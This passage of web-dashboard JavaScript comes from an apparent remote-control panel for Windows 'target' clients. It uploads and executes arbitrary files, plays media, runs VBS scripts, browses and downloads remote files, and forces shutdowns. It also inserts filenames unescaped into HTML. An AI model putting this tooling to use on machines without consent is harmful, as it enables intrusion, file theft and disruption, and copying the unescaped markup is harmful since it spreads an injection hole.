    videoMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    filesMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    photosMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    clientIdsMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    blocklistMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    
    audioMainContent.classList.add('hidden');
    vbsMainContent.classList.add('hidden');
    videoMainContent.classList.add('hidden');
    filesMainContent.classList.add('hidden');
    photosMainContent.classList.add('hidden');
    clientIdsMainContent.classList.add('hidden');
    blocklistMainContent.classList.add('hidden');
    
    // Activate selected tool and refresh its library
    if (tool === 'audio') {
        audioMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-indigo-600 text-white';
        audioMainContent.classList.remove('hidden');
        // Refresh audio library if on library tab
        if (document.getElementById('libraryTabContent') && !document.getElementById('libraryTabContent').classList.contains('hidden')) {
            loadAudioLibrary();
        }
    } else if (tool === 'vbs') {
        vbsMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-teal-600 text-white';
        vbsMainContent.classList.remove('hidden');
        // Refresh VBS library if on library tab
        if (document.getElementById('vbsLibraryTabContent') && !document.getElementById('vbsLibraryTabContent').classList.contains('hidden')) {
            loadVbsLibrary();
        }
    } else if (tool === 'video') {
        videoMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-purple-600 text-white';
        videoMainContent.classList.remove('hidden');
        // Refresh video library if on library tab
        if (document.getElementById('videoLibraryTabContent') && !document.getElementById('videoLibraryTabContent').classList.contains('hidden')) {
            loadVideoLibrary();
        }
    } else if (tool === 'files') {
        filesMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-orange-600 text-white';
        filesMainContent.classList.remove('hidden');
        // Refresh files library if on library tab
        if (document.getElementById('filesLibraryTabContent') && !document.getElementById('filesLibraryTabContent').classList.contains('hidden')) {
            loadFilesLibrary();
        }
    } else if (tool === 'photos') {
        photosMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-pink-600 text-white';
        photosMainContent.classList.remove('hidden');
    } else if (tool === 'clientIds') {
        clientIdsMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-cyan-600 text-white';
        clientIdsMainContent.classList.remove('hidden');
        loadClientIdsTable();
    } else if (tool === 'blocklist') {
        blocklistMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-red-600 text-white';
        blocklistMainContent.classList.remove('hidden');
        loadBlocklist();
    }
}

// ========== Video Playback Functions ==========

// Video tab switching
function switchVideoTab(tab) {
    const videoUploadTabBtn = document.getElementById('videoUploadTabBtn');
    const videoLibraryTabBtn = document.getElementById('videoLibraryTabBtn');
    const videoDumpTabBtn = document.getElementById('videoDumpTabBtn');
    const videoUploadTabContent = document.getElementById('videoUploadTabContent');
    const videoLibraryTabContent = document.getElementById('videoLibraryTabContent');
    const videoDumpTabContent = document.getElementById('videoDumpTabContent');
    
    // Reset all
    videoUploadTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    videoLibraryTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    videoDumpTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    videoUploadTabContent.classList.add('hidden');
    videoLibraryTabContent.classList.add('hidden');
    videoDumpTabContent.classList.add('hidden');
    
    if (tab === 'upload') {
        videoUploadTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-purple-600 text-white';
        videoUploadTabContent.classList.remove('hidden');
    } else if (tab === 'library') {
        videoLibraryTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-purple-600 text-white';
        videoLibraryTabContent.classList.remove('hidden');
        loadVideoLibrary();
    } else if (tab === 'dump') {
        videoDumpTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-yellow-600 text-white';
        videoDumpTabContent.classList.remove('hidden');
    }
}

// Play video on client (upload new)
async function playVideoOnClient() {
    const videoFileInput = document.getElementById('videoFileInput');
    const videoClientSelect = document.getElementById('videoClientSelect');
    const playVideoBtn = document.getElementById('playVideoBtn');
    
    const clientId = videoClientSelect.value;
    const file = videoFileInput.files[0];
    
    // Validation
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    if (!file) {
        alert('Please select a video file');
        return;
    }
    
    const validExtensions = ['.mp4', '.avi', '.mkv', '.webm'];
    const fileName = file.name.toLowerCase();
    const isValidExtension = validExtensions.some(ext => fileName.endsWith(ext));
    
    if (!isValidExtension) {
        alert('Only video files (.mp4, .avi, .mkv, .webm) are supported');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    // Disable button during upload
    playVideoBtn.disabled = true;
    playVideoBtn.innerHTML = `
        <span class="flex items-center justify-center space-x-2">
            <svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            <span>Uploading...</span>
        </span>
    `;
    
    try {
        // Create FormData and append file
        const formData = new FormData();
        formData.append('videoFile', file);
        
        // Send to server
        const response = await fetch(`${SERVER_URL}/api/play-video/${clientId}`, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`🎬 Video "${result.filename}" sent to ${hostname} (saved to library)`, 'success');
            // Clear file input
            videoFileInput.value = '';
            // Refresh libraries in other tabs
            setTimeout(() => {
                loadVideoLibrary();
                loadFilesLibrary();
            }, 500);
        } else {
            addLog(`Failed to send video to ${hostname}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to upload video file: ${error.message}`, 'error');
    } finally {
        // Re-enable button
        playVideoBtn.disabled = false;
        playVideoBtn.innerHTML = `
            <span class="flex items-center justify-center space-x-2">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path>
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
                <span>Upload & Play</span>
            </span>
        `;
    }
}

// Load video library
async function loadVideoLibrary() {
    const videoLibraryList = document.getElementById('videoLibraryList');
    videoLibraryList.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">Loading video files...</p>';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/video-files`);
        const files = await response.json();
        
        if (files.length === 0) {
            videoLibraryList.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">No video files uploaded yet</p>';
            return;
        }
        
        videoLibraryList.innerHTML = files.map(file => `
            <div class="bg-gh-bg-tertiary rounded-lg p-3 border border-gh-border flex items-center justify-between hover:border-gh-text-muted transition-colors">
                <div class="flex items-center space-x-3 flex-1">
                    <div class="w-10 h-10 bg-purple-900 rounded-lg flex items-center justify-center">
                        <svg class="w-5 h-5 text-purple-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
                        </svg>
                    </div>
                    <div class="flex-1 min-w-0">
                        <p class="text-gh-text text-sm font-medium truncate">${file.filename}</p>
                        <p class="text-gh-text-muted text-xs">${formatFileSize(file.size)} • ${new Date(file.uploadedAt).toLocaleString()}</p>
                    </div>
                </div>
                <div class="flex items-center space-x-2">
                    <button 
                        onclick="playVideoFromLibrary('${file.filename}')"
                        class="bg-purple-600 hover:bg-purple-700 text-white px-3 py-2 rounded-lg text-xs font-semibold transition-colors"
                    >
                        Play
                    </button>
                    <button 
                        onclick="deleteVideoFile('${file.filename}')"
                        class="bg-red-900 hover:bg-red-800 text-red-300 px-3 py-2 rounded-lg text-xs font-semibold transition-colors border border-red-700"
                    >
                        Delete
                    </button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        videoLibraryList.innerHTML = '<p class="text-red-300 text-sm text-center py-4">Failed to load video files</p>';
        addLog('Failed to load video library', 'error');
    }
}

// Play video from library
async function playVideoFromLibrary(filename) {
    const videoClientSelectLibrary = document.getElementById('videoClientSelectLibrary');
    const clientId = videoClientSelectLibrary.value;
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/play-video-library/${clientId}/${encodeURIComponent(filename)}`, {
            method: 'POST'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`🎬 Playing "${filename}" on ${hostname}`, 'success');
        } else {
            addLog(`Failed to play video on ${hostname}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to play video: ${error.message}`, 'error');
    }
}

// Delete video file
async function deleteVideoFile(filename) {
    if (!confirm(`Delete "${filename}" from library?`)) {
        return;
    }
    
    try {
        const response = await fetch(`${SERVER_URL}/api/video-files/${encodeURIComponent(filename)}`, {
            method: 'DELETE'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`Deleted video file: ${filename}`, 'success');
            loadVideoLibrary(); // Reload library
        } else {
            addLog(`Failed to delete ${filename}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to delete video file: ${error.message}`, 'error');
    }
}

// ========== General Files Functions ==========

// Files tab switching
function switchFilesTab(tab) {
    const filesUploadTabBtn = document.getElementById('filesUploadTabBtn');
    const filesLibraryTabBtn = document.getElementById('filesLibraryTabBtn');
    const filesDumpTabBtn = document.getElementById('filesDumpTabBtn');
    const filesUploadTabContent = document.getElementById('filesUploadTabContent');
    const filesLibraryTabContent = document.getElementById('filesLibraryTabContent');
    const filesDumpTabContent = document.getElementById('filesDumpTabContent');
    
    // Reset all buttons
    filesUploadTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    filesLibraryTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    filesDumpTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    
    // Hide all content
    filesUploadTabContent.classList.add('hidden');
    filesLibraryTabContent.classList.add('hidden');
    filesDumpTabContent.classList.add('hidden');
    
    if (tab === 'upload') {
        filesUploadTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-orange-600 text-white';
        filesUploadTabContent.classList.remove('hidden');
    } else if (tab === 'library') {
        filesLibraryTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-orange-600 text-white';
        filesLibraryTabContent.classList.remove('hidden');
        loadFilesLibrary();
    } else if (tab === 'dump') {
        filesDumpTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-yellow-600 text-white';
        filesDumpTabContent.classList.remove('hidden');
    }
}

// Execute file on client (upload new)
async function executeFileOnClient() {
    const fileInput = document.getElementById('generalFileInput');
    const clientSelect = document.getElementById('filesClientSelect');
    const executeFileBtn = document.getElementById('executeFileBtn');
    
    const clientId = clientSelect.value;
    const file = fileInput.files[0];
    
    // Validation
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    if (!file) {
        alert('Please select a file');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    // Disable button during upload
    executeFileBtn.disabled = true;
    executeFileBtn.innerHTML = `
        <span class="flex items-center justify-center space-x-2">
            <svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            <span>Uploading...</span>
        </span>
    `;
    
    try {
        // Create FormData and append file
        const formData = new FormData();
        formData.append('file', file);
        
        // Send to server
        const response = await fetch(`${SERVER_URL}/api/execute-file/${clientId}`, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`📁 File "${result.filename}" executed on ${hostname} (saved to library)`, 'success');
            // Clear file input
            fileInput.value = '';
            // Refresh all libraries
            setTimeout(() => {
                loadFilesLibrary();
                // Check file type and refresh appropriate library
                const fileName = file.name.toLowerCase();
                if (fileName.endsWith('.wav')) {
                    loadAudioLibrary();
                } else if (fileName.endsWith('.vbs')) {
                    loadVbsLibrary();
                } else if (fileName.endsWith('.mp4') || fileName.endsWith('.avi') || fileName.endsWith('.mkv') || fileName.endsWith('.webm')) {
                    loadVideoLibrary();
                }
            }, 500);
        } else {
            addLog(`Failed to execute file on ${hostname}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to upload file: ${error.message}`, 'error');
    } finally {
        // Re-enable button
        executeFileBtn.disabled = false;
        executeFileBtn.innerHTML = `
            <span class="flex items-center justify-center space-x-2">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                </svg>
                <span>Upload & Execute</span>
            </span>
        `;
    }
}

// Load files library
async function loadFilesLibrary() {
    const filesLibraryList = document.getElementById('filesLibraryList');
    filesLibraryList.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">Loading files...</p>';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/general-files`);
        const files = await response.json();
        
        if (files.length === 0) {
            filesLibraryList.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">No files uploaded yet</p>';
            return;
        }
        
        filesLibraryList.innerHTML = files.map(file => `
            <div class="bg-gh-bg-tertiary rounded-lg p-3 border border-gh-border flex items-center justify-between hover:border-gh-text-muted transition-colors">
                <div class="flex items-center space-x-3 flex-1">
                    <div class="w-10 h-10 bg-orange-900 rounded-lg flex items-center justify-center">
                        <svg class="w-5 h-5 text-orange-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 21h10a2 2 0 002-2V9.414a1 1 0 00-.293-.707l-5.414-5.414A1 1 0 0012.586 3H7a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
                        </svg>
                    </div>
                    <div class="flex-1 min-w-0">
                        <p class="text-gh-text text-sm font-medium truncate">${file.filename}</p>
                        <p class="text-gh-text-muted text-xs">${file.extension.toUpperCase()} • ${formatFileSize(file.size)} • ${new Date(file.uploadedAt).toLocaleString()}</p>
                    </div>
                </div>
                <div class="flex items-center space-x-2">
                    <button 
                        onclick="executeFileFromLibrary('${file.filename}')"
                        class="bg-orange-600 hover:bg-orange-700 text-white px-3 py-2 rounded-lg text-xs font-semibold transition-colors"
                    >
                        Execute
                    </button>
                    <button 
                        onclick="deleteGeneralFile('${file.filename}')"
                        class="bg-red-900 hover:bg-red-800 text-red-300 px-3 py-2 rounded-lg text-xs font-semibold transition-colors border border-red-700"
                    >
                        Delete
                    </button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        filesLibraryList.innerHTML = '<p class="text-red-300 text-sm text-center py-4">Failed to load files</p>';
        addLog('Failed to load files library', 'error');
    }
}

// Execute file from library
async function executeFileFromLibrary(filename) {
    const clientSelectLibrary = document.getElementById('filesClientSelectLibrary');
    const clientId = clientSelectLibrary.value;
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/execute-file-library/${clientId}/${encodeURIComponent(filename)}`, {
            method: 'POST'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`📁 Executing "${filename}" on ${hostname}`, 'success');
        } else {
            addLog(`Failed to execute file on ${hostname}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to execute file: ${error.message}`, 'error');
    }
}

// Delete general file
async function deleteGeneralFile(filename) {
    if (!confirm(`Delete "${filename}" from library?`)) {
        return;
    }
    
    try {
        const response = await fetch(`${SERVER_URL}/api/general-files/${encodeURIComponent(filename)}`, {
            method: 'DELETE'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`Deleted file: ${filename}`, 'success');
            loadFilesLibrary(); // Reload library
        } else {
            addLog(`Failed to delete ${filename}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to delete file: ${error.message}`, 'error');
    }
}

// ========== File Explorer Functions ==========

let currentFileExplorerClientId = null;
let currentCommandId = null;

// Open file explorer
function openFileExplorer(clientId) {
    const client = clients.find(c => c.id === clientId);
    if (!client) return;
    
    currentFileExplorerClientId = clientId;
    document.getElementById('fileExplorerClientName').textContent = `Client: ${client.hostname}`;
    document.getElementById('fileExplorerModal').classList.remove('hidden');
    document.getElementById('filePath').value = 'C:\\';
}

// Close file explorer
function closeFileExplorer() {
    document.getElementById('fileExplorerModal').classList.add('hidden');
    currentFileExplorerClientId = null;
}

// Browse directory
async function browseDirectory() {
    const pathInput = document.getElementById('filePath');
    const dirPath = pathInput.value;
    
    if (!currentFileExplorerClientId) return;
    
    const fileList = document.getElementById('fileList');
    fileList.innerHTML = '<div class="text-gh-text-secondary text-center py-8">Loading...</div>';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/list-directory/${currentFileExplorerClientId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ path: dirPath })
        });
        
        const result = await response.json();
        currentCommandId = result.requestId;
        
        addLog(`📁 Browsing ${dirPath}`, 'info');
    } catch (error) {
        fileList.innerHTML = '<div class="text-red-300 text-center py-8">Failed to load directory</div>';
        addLog(`Failed to browse directory: ${error.message}`, 'error');
    }
}

// Display files from command result
function displayFileList(files, currentPath) {
    const fileList = document.getElementById('fileList');
    
    if (!files || files.length === 0) {
        fileList.innerHTML = '<div class="text-gh-text-secondary text-center py-8">Empty directory</div>';
        return;
    }
    
    fileList.innerHTML = files.map(file => `
        <div class="flex items-center space-x-3 p-2 hover:bg-gh-bg-tertiary rounded-lg cursor-pointer border border-transparent hover:border-gh-border transition-colors" 
             ${file.Type === 'Directory' ? `ondblclick="navigateToFolder('${currentPath}', '${file.Name}')"`  : ''}>
            <div class="w-8 h-8 flex items-center justify-center">
                ${file.Type === 'Directory' ? 
                    `<svg class="w-6 h-6 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path>
                    </svg>` :
                    `<svg class="w-6 h-6 text-gh-text-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 21h10a2 2 0 002-2V9.414a1 1 0 00-.293-.707l-5.414-5.414A1 1 0 0012.586 3H7a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
                    </svg>`
                }
            </div>
            <div class="flex-1 min-w-0">
                <p class="text-gh-text text-sm truncate">${file.Name}</p>
                <p class="text-gh-text-muted text-xs">${file.Type} ${file.Length ? `• ${formatFileSize(file.Length)}` : ''}</p>
            </div>
            ${file.Type === 'File' ? 
                `<button onclick="downloadFile('${currentPath}', '${file.Name}')" class="bg-cyan-600 hover:bg-cyan-700 text-white px-3 py-1 rounded text-xs font-semibold">
                    Download
                </button>` : ''
            }
        </div>
    `).join('');
}

// Navigate to folder
function navigateToFolder(currentPath, folderName) {
    const pathInput = document.getElementById('filePath');
    let newPath = currentPath.endsWith('\\') ? currentPath + folderName : currentPath + '\\' + folderName;
    pathInput.value = newPath;
    browseDirectory();
}

// Download file from client
async function downloadFile(dirPath, filename) {
    if (!currentFileExplorerClientId) return;
    
    const filePath = dirPath.endsWith('\\') ? dirPath + filename : dirPath + '\\' + filename;
    
    try {
        const response = await fetch(`${SERVER_URL}/api/download-file/${currentFileExplorerClientId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filePath: filePath })
        });
        
        const result = await response.json();
        addLog(`📥 Downloading ${filename}...`, 'info');
    } catch (error) {
        addLog(`Failed to download file: ${error.message}`, 'error');
    }
}

// Handle file upload
async function handleFileUpload() {
    const fileInput = document.getElementById('uploadFileInput');
    const file = fileInput.files[0];
    
    if (!file || !currentFileExplorerClientId) return;
    
    const pathInput = document.getElementById('filePath');
    const targetPath = pathInput.value;
    
    const formData = new FormData();
    formData.append('file', file);
    formData.append('targetPath', targetPath);
    
    try {
        const response = await fetch(`${SERVER_URL}/api/upload-to-client/${currentFileExplorerClientId}`, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        if (response.ok) {
            addLog(`📤 Uploaded ${file.name} to ${targetPath}`, 'success');
            fileInput.value = '';
            // Refresh directory listing
            setTimeout(() => browseDirectory(), 1000);
        } else {
            addLog(`Failed to upload file: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to upload file: ${error.message}`, 'error');
    }
}

// Listen for command results containing file listings
socket.on('commandResult', (result) => {
    // Handle file listing results
    if (result.commandId === currentCommandId && result.success) {
        try {
            const output = result.output.trim();
            if (output.startsWith('[') || output.startsWith('{')) {
                const files = JSON.parse(output);
                const currentPath = document.getElementById('filePath').value;
                displayFileList(Array.isArray(files) ? files : [files], currentPath);
            }
        } catch (e) {
            // Not a file listing, ignore
        }
    }
});

// Render client cards
function renderClients() {
    if (clients.length === 0) {
        clientsListEl.innerHTML = `
            <div class="col-span-full flex flex-col items-center justify-center py-12 text-center">
                <div class="w-16 h-16 bg-gh-bg-tertiary rounded-lg flex items-center justify-center mb-4">
                    <svg class="w-8 h-8 text-gh-text-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
                    </svg>
                </div>
                <p class="text-gh-text-secondary text-lg">No clients connected</p>
                <p class="text-gh-text-muted text-sm mt-2">Install and run the Windows client on your target machines</p>
            </div>
        `;
        return;
    }

    clientsListEl.innerHTML = clients.map(client => `
        <div class="bg-gh-bg-secondary rounded-lg p-6 border ${client.connected ? 'border-green-500' : 'border-red-500'} ${selectedClients.has(client.id) ? 'ring-2 ring-purple-500' : ''} card-hover"
             data-client-id="${client.id}">
            
            <!-- Client Header -->
            <div class="flex items-center justify-between mb-4">
                <div class="flex items-center space-x-3">
                    <div class="w-12 h-12 ${client.connected ? 'bg-green-900' : 'bg-red-900'} rounded-lg flex items-center justify-center">
                        <svg class="w-6 h-6 ${client.connected ? 'text-green-300' : 'text-red-300'}" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
                        </svg>
                    </div>
                    <div>
                        <h3 class="text-gh-text font-bold text-lg">${client.hostname}</h3>
                        <p class="text-gh-text-secondary text-sm">${client.ip}</p>
                    </div>
                </div>
                
                <div class="flex flex-col items-end space-y-2">
                    <span class="px-3 py-1 rounded-full text-xs font-semibold ${client.connected ? 'bg-green-900 text-green-300 border border-green-700' : 'bg-red-900 text-red-300 border border-red-700'}">
                        ${client.connected ? '● Online' : '● Offline'}
                    </span>
                    ${client.id.startsWith('client') ? '<span class="px-3 py-1 rounded-full text-xs font-semibold bg-blue-900 text-blue-300 border border-blue-700">✨ Latest</span>' : ''}
                </div>
            </div>

            <!-- Client Info -->
            <div class="mb-4 p-3 bg-gh-bg rounded-lg">
                <p class="text-gh-text-secondary text-sm">
                    <span class="text-gh-text-muted">Last seen:</span> 
                    <span class="text-gh-text">${new Date(client.lastSeen).toLocaleString()}</span>
                </p>
            </div>

            <!-- Selection Checkbox -->
            <div class="mb-4">
                <label class="flex items-center space-x-3 cursor-pointer">
                    <input type="checkbox" ${selectedClients.has(client.id) ? 'checked' : ''} 
                           onchange="toggleClientSelection('${client.id}')"
                           class="w-4 h-4 text-purple-600 bg-gh-bg-tertiary border-gh-border rounded focus:ring-purple-500 focus:ring-2">
                    <span class="text-gh-text-secondary text-sm">Select for broadcast</span>
                </label>
            </div>

            <!-- Action Buttons -->
            <div class="space-y-2">
                <!-- Power Control Row -->
                <div class="grid grid-cols-3 gap-2">
                    <button onclick="shutdownClient('${client.id}', false)" 
                            ${!client.connected ? 'disabled' : ''}
                            class="flex items-center justify-center space-x-1 py-2 px-2 rounded-lg font-semibold text-xs transition-colors duration-200 ${!client.connected ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-red-900 hover:bg-red-800 text-red-300 border border-red-700'}">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728L5.636 5.636m12.728 12.728L18 21l-5.197-5.197m0 0L5.636 5.636M13.803 15.803L18 21"></path>
                        </svg>
                        <span>Shutdown</span>
                    </button>
                    
                    <button onclick="rebootClient('${client.id}', false)" 
                            ${!client.connected ? 'disabled' : ''}
                            class="flex items-center justify-center space-x-1 py-2 px-2 rounded-lg font-semibold text-xs transition-colors duration-200 ${!client.connected ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-yellow-900 hover:bg-yellow-800 text-yellow-300 border border-yellow-700'}">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
                        </svg>
                        <span>Reboot</span>
                    </button>
                    
                    <button onclick="cancelClient('${client.id}')" 
                            ${!client.connected ? 'disabled' : ''}
                            class="flex items-center justify-center space-x-1 py-2 px-2 rounded-lg font-semibold text-xs transition-colors duration-200 ${!client.connected ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-gray-700 hover:bg-gray-600 text-gray-300 border border-gray-600'}">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                        </svg>
                        <span>Cancel</span>
                    </button>
                </div>

                <!-- Force Power Control Row -->
                <div class="grid grid-cols-2 gap-2">
                    <button onclick="shutdownClient('${client.id}', true)" 
                            ${!client.connected ? 'disabled' : ''}
                            class="flex items-center justify-center space-x-1 py-2 px-2 rounded-lg font-semibold text-xs transition-colors duration-200 ${!client.connected ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-red-700 hover:bg-red-600 text-red-200 border border-red-600'}">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
                        </svg>
                        <span>Force Shutdown</span>
                    </button>
                    
                    <button onclick="rebootClient('${client.id}', true)" 
                            ${!client.connected ? 'disabled' : ''}
